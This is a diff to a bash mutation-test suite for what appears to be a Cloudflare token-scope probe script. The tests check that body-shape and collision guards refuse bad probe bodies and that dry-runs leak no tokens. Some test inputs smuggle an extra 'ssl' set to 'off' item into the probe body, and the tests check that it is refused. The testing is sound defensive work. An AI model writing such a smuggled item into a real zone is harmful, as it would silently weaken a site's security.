+  "$ZR_SET_ROW"$'\n'"$ZR_BOT_ROW" "$ZR_BOT_ROW"$'\n'"$ZR_SET_ROW"
+assert_eq "MUT Guard 1 H2 reordered: the settings row still carries SETTINGS_PROBE_BODY" 2 "$(m_body_n PATCH '/settings$' "$SET_BODY")"
+assert_eq "MUT Guard 1 H2 reordered: the bot row still carries INVALID_BODY" 2 "$(m_body_n PUT '/bot_management$' "$INV_BODY")"
+# Guard 2 (SETTINGS_PROBE_BODY shape): each refused before any Doppler read.
+G2_MSG="SETTINGS_PROBE_BODY is not probe-shaped"
+run_mut "M11d body not JSON" 2 0 0 "$G2_MSG" "$SET_LIT_LINE" "$(set_lit "${WANT_SET_BODY%\}}")"
+run_mut "M11d body {\"items\":[]}" 2 0 0 "$G2_MSG" "$SET_LIT_LINE" "$(set_lit '{"items":[]}')"
+run_mut "M11d body a JSON array" 2 0 0 "$G2_MSG" "$SET_LIT_LINE" "$(set_lit '[{"id":"cf_token_scope_probe_x","value":"y"}]')"
+run_mut "M11d a second, non-prefixed item" 2 0 0 "$G2_MSG" "$SET_LIT_LINE" "$(set_lit '{"items":[{"id":"cf_token_scope_probe_nonexistent_setting","value":"cf_token_scope_probe_never_valid"},{"id":"ssl","value":"off"}]}')"
+run_mut "M11d an extra top-level key beside items" 2 0 0 "$G2_MSG" "$SET_LIT_LINE" "$(set_lit '{"items":[{"id":"cf_token_scope_probe_nonexistent_setting","value":"cf_token_scope_probe_never_valid"}],"ssl":"off"}')"
+run_mut "Guard 2 dispatch: jq shape check neutered, empty items (the runtime check is what refuses)" 0 4 2 "probe=zone-rest verdict=pass" \
+  "$GUARD_JQ_LINE" "     'true' >/dev/null 2>&1; then" "$SET_LIT_LINE" "$(set_lit '{"items":[]}')"
+MUT_ARGS=(--profile zone-rest --dry-run)
+run_mut "Guard 2 H2 two compliant items -> dry-run passes" 0 0 0 "cf_token_scope_probe_b" "$SET_LIT_LINE" "$(set_lit '{"items":[{"id":"cf_token_scope_probe_a","value":"cf_token_scope_probe_never_valid"},{"id":"cf_token_scope_probe_b","value":"cf_token_scope_probe_never_valid"}]}')"
+MUT_ARGS=(--profile zone-rest)
+# Guard 3 (collision): dispatch rows prove the check, not the mock, stops the write.
+MOCK_ZSET="$ZS_HIT1" run_mut "Guard 3 dispatch: collision jq reads a never-set variable -> fail-closed, not the collision message" 2 0 2 "could not evaluate the settings list" \
+  "$COLL_LINE" "$COLL_NEVER_SET_LINE"
+lacks "a setting named like the probe id exists" "MUT Guard 3 dispatch: the collision message needs the real list"
+MOCK_ZSET="$ZS_HIT1" run_mut "Guard 3 removed: a listed probe id would be written to" 0 4 2 "probe=zone-rest verdict=pass" "$COLL_LINE" '  mig_rc=1'
+}
+
 # --- M10: dry-run prints the recipes, sends nothing, keeps tokens unexpanded ---
 MCM10="$WORK/m10-curl-marker"; rm -f "$MCM10"
 MOCK_CURL_MARKER="$MCM10" run "$MOCKPATH" --profile redirects-dns --dry-run
@@ -1204,6 +1406,36 @@ has "INVALID_BODY='$INV_BODY'" "M10 dry-run prints the fixed body literal"
 has '"$CF_API_TOKEN_PAGES"' "M10 dry-run keeps token variables unexpanded"
 lacks "fake-secret-abc123xyz" "M10 dry-run leaks no token value"
 has "zones/$NEW_ZONE/rulesets/phases/http_request_dynamic_redirect/entrypoint" "M10 dry-run targets the NEW zone by default"
+has "SETTINGS_PROBE_BODY='$SET_BODY'" "M10 dry-run prints the settings probe literal too"
+rm -f "$MCM10"
+MOCK_CURL_MARKER="$MCM10" run "$MOCKPATH" --profile zone-rest --dry-run
+assert_rc 0 "M10 zone-rest dry-run -> exit 0"
+if [[ ! -e "$MCM10" ]]; then ok "M10 zone-rest dry-run never invoked curl"; else no "M10 zone-rest dry-run invoked curl"; fi
+has "INVALID_BODY='$INV_BODY'" "M10 zone-rest dry-run prints INVALID_BODY"
+has "SETTINGS_PROBE_BODY='$SET_BODY'" "M10 zone-rest dry-run prints SETTINGS_PROBE_BODY"
+# Per row: the kind comment, then the printed w_body assignment, then both recipes.
+m10_seq() {
+  awk -v hdr="$1" -v asg="$2" -v url="$3" '
+    found == 0 && index($0, hdr) == 1 { found = 1; n = 0; next }
+    found == 1 { n++
+      if (n == 1 && $0 != asg) bad = 1
+      if ((n == 2 || n == 3) && (index($0, url) == 0 || index($0, "--data-binary \"$w_body\"") == 0)) bad = 1
+      if (n == 3) found = 2 }
+    END { exit !(found == 2 && !bad) }' "$OUTFILE"
+}
+# shellcheck disable=SC2016  # the printed, unexpanded assignment is the assertion
+if m10_seq '# write zones/<zone>/settings (body-kind settings-json)' 'w_body="$SETTINGS_PROBE_BODY"' "zones/$NEW_ZONE/settings"; then
+  ok "M10 the settings recipes follow (body-kind settings-json) and w_body=\"\$SETTINGS_PROBE_BODY\""
+else
+  no "M10 settings recipe block wrong (see $OUTFILE)"
+fi
+# shellcheck disable=SC2016  # the printed, unexpanded assignment is the assertion
+if m10_seq '# write zones/<zone>/bot_management (body-kind invalid)' 'w_body="$INVALID_BODY"' "zones/$NEW_ZONE/bot_management"; then
+  ok "M10 the bot_management recipes follow (body-kind invalid) and w_body=\"\$INVALID_BODY\""
+else
+  no "M10 bot_management recipe block wrong (see $OUTFILE)"
+fi
+for leak in tok-zonesettings-mock tok-botmgmt-mock; do lacks "$leak" "M10 zone-rest dry-run leaks no token $leak"; done
 
 # --- D-doc: SKILL.md / playbook documentation pins (AC7) ---
 d_has() { if grep -qF -- "$1" "$2"; then ok "$3"; else no "$3 (missing: $1 in $2)"; fi }
@@ -1227,7 +1459,7 @@ else
 fi
 
 printf '\n%d passed, %d failed\n' "$pass" "$fail"
-MIN_ASSERTIONS=320
+MIN_ASSERTIONS=456
 if [[ "$((pass + fail))" -lt "$MIN_ASSERTIONS" ]]; then
   printf 'ANTI-VACUITY FLOOR: only %s assertions ran, floor is %s\n' "$((pass + fail))" "$MIN_ASSERTIONS" >&2
   exit 1
